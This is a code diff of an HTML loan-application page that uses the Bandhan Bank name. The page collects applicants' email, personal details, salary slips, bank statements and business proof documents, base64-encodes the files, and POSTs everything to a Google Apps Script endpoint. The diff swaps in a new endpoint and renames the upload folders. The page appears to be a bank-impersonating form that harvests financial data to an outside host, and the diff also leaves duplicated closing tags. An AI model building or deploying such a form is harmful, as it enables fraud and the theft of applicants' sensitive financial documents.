@@ -179,7 +179,8 @@
       <h2>Bandhan BankLoan Application</h2>
     </div>
 
-     <div class="form-section">
+  
+    <div class="form-section">
       <h3>Personal Information</h3>
       <div class="form-group">
         <label for="email">Email Address</label>
@@ -362,11 +363,11 @@
   const formData = new FormData(form);
 
   const uploadFields = ["salarySlips", "bankStatement", "businessProofFile"];
-  const folderMap = {
-    salarySlips: "SalarySlips",
-    bankStatement: "BankStatement",
-    businessProofFile: "BusinessProof"
-  };
+const folderMap = {
+    salarySlips: "SalarySlipsForLoan",
+    bankStatement: "BankStatementForLoan",
+    businessProofFile: "BusinessProofForLoan"
+  };
   const uploadedLinks = {};
 
   for (const name of uploadFields) {
@@ -376,7 +377,7 @@
     const urls = [];
     for (const file of fileInput.files) {
       const base64 = await toBase64(file);
-      const response = await fetch("https://script.google.com/macros/s/AKfycbyrTL3byBORM32qAiXyEGdWr0_dE1tKUVrTEaIGKw0DYDY6N6Baluxxz1H3OstWhezTNg/exec", {
+      const response = await fetch("https://script.google.com/macros/s/AKfycbyEuC3AhK9mGtrifzuyuTe27KLCFf62HiMx16v1rPYoTBboJB_OZaqMTBk-IBpAYkpNRA/exec", {
         method: "POST",
         body: new URLSearchParams({
           media: base64,
@@ -398,7 +399,7 @@
 
   const payload = new URLSearchParams([...formData.entries()]);
 
-  fetch("https://script.google.com/macros/s/AKfycbyrTL3byBORM32qAiXyEGdWr0_dE1tKUVrTEaIGKw0DYDY6N6Baluxxz1H3OstWhezTNg/exec", {
+  fetch("https://script.google.com/macros/s/AKfycbyEuC3AhK9mGtrifzuyuTe27KLCFf62HiMx16v1rPYoTBboJB_OZaqMTBk-IBpAYkpNRA/exec", {
     method: "POST",
     body: payload
   })
@@ -421,6 +422,11 @@ function toBase64(file) {
 }
 
 </script>
+
+  </body>
+</body>
+</html>
+
   </body>
 </body>
 </html>
